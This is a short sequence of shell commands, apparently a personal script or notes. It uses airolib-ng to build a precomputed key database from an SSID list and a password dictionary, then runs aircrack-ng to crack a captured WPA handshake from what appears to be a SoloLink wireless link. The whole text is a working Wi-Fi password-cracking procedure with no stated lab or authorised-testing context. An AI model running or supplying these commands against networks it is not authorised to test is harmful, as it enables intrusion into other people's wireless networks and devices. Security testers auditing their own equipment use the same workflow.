airolib-ng SoloLinkDB --import essid SSIDs.txt 
airolib-ng SoloLinkDB --import password dict.txt
airolib-ng SoloLinkDB --clean all
airolib-ng SoloLinkDB --batch
airolib-ng SoloLinkDB --stats
aircrack-ng -r SoloLinkDB ../SoloLink_WPA_handshake.pcap 

